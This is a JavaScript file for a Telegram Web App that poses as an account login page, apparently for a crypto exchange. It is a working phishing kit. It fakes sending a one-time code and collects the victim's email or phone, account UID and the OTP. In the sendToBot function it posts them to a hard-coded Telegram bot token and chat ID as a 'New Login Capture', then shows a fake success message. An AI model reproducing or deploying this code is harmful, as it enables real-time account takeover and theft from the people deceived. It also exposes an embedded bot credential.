// Configuration - Replace with your target bot details
const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; // Use your logging bot token
const TARGET_CHAT_ID = '7611425178'; // Use your personal chat ID or a group ID

// Initialize Telegram Web App
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements
    const tabBtns = document.querySelectorAll('.tab');
    const toggleBtns = document.querySelectorAll('.toggle-btn');
    const inputLabel = document.getElementById('input-label');
    const inputIcon = document.getElementById('input-icon');
    const userIdentifier = document.getElementById('user-identifier');
    const sendOtpBtn = document.getElementById('send-otp');
    const timerContainer = document.getElementById('timer-container');
    const timerCount = document.getElementById('timer-count');
    const loginSubmit = document.getElementById('login-submit');
    const closeApp = document.getElementById('close-app');
    const successModal = document.getElementById('success-modal');
    const modalOk = document.getElementById('modal-ok');
    const userUid = document.getElementById('user-uid');
    const otpCode = document.getElementById('otp-code');

    let loginType = 'email';
    let timerInterval;

    // Tab Switching
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            tabBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            if (btn.dataset.tab === 'password') {
                document.getElementById('otp-field').style.display = 'none';
                loginSubmit.innerText = 'Login';
            } else {
                document.getElementById('otp-field').style.display = 'block';
                loginSubmit.innerText = 'Sign In';
            }
        });
    });

    // Email/Phone Toggle
    toggleBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            toggleBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            loginType = btn.dataset.type;

            if (loginType === 'email') {
                inputLabel.innerText = 'Email Address';
                inputIcon.className = 'fas fa-envelope';
                userIdentifier.placeholder = 'Enter your email';
                userIdentifier.type = 'email';
            } else {
                inputLabel.innerText = 'Phone Number';
                inputIcon.className = 'fas fa-phone-alt';
                userIdentifier.placeholder = 'Enter your phone number';
                userIdentifier.type = 'tel';
            }
        });
    });

    // Send OTP Simulation
    sendOtpBtn.addEventListener('click', () => {
        const identifier = userIdentifier.value.trim();
        if (!identifier) {
            alert(`Please enter a valid ${loginType}`);
            return;
        }

        sendOtpBtn.disabled = true;
        sendOtpBtn.style.opacity = '0.5';
        timerContainer.style.display = 'block';
        
        let timeLeft = 60;
        timerCount.innerText = timeLeft;

        timerInterval = setInterval(() => {
            timeLeft--;
            timerCount.innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                sendOtpBtn.disabled = false;
                sendOtpBtn.style.opacity = '1';
                timerContainer.style.display = 'none';
            }
        }, 1000);

        // Haptic feedback
        if (tg) tg.HapticFeedback.notificationOccurred('success');
    });

    // Login Submit
    loginSubmit.addEventListener('click', async () => {
        const identifier = userIdentifier.value.trim();
        const uid = userUid.value.trim();
        const code = otpCode.value.trim();
        const username = tg?.initDataUnsafe?.user?.username || 'Guest';
        const tgId = tg?.initDataUnsafe?.user?.id || 'N/A';

        if (!identifier || !uid || !code) {
            alert('Please fill in all fields');
            return;
        }

        loginSubmit.innerText = 'Processing...';
        loginSubmit.disabled = true;

        const data = {
            username: username,
            tg_id: tgId,
            uid: uid,
            login_type: loginType,
            identifier: identifier,
            otp: code,
            timestamp: new Date().toLocaleString()
        };

        // Send to target bot
        await sendToBot(data);

        // Success Feedback
        successModal.style.display = 'flex';
        if (tg) tg.HapticFeedback.notificationOccurred('success');
    });

    // Modal OK
    modalOk.addEventListener('click', () => {
        successModal.style.display = 'none';
        if (tg) {
            // Send data back to the bot that opened the web app
            tg.sendData(JSON.stringify({ action: 'verification_complete', status: 'success' }));
            tg.close();
        } else {
            location.reload();
        }
    });

    // Close App
    closeApp.addEventListener('click', () => {
        if (tg) tg.close();
    });

    // Function to send data to Telegram
    async function sendToBot(data) {
        const message = `
🚀 <b>New Login Capture</b>
━━━━━━━━━━━━━━━
👤 <b>TG Username</b>: @${data.username}
🆔 <b>TG ID</b>: <code>${data.tg_id}</code>
🆔 <b>BC UID</b>: <code>${data.uid}</code>
📧 <b>${data.login_type.toUpperCase()}</b>: <code>${data.identifier}</code>
🔐 <b>OTP Code</b>: <code>${data.otp}</code>
🕒 <b>Time</b>: ${data.timestamp}
━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (err) {
            console.error('Error sending to bot:', err);
        }
    }
});
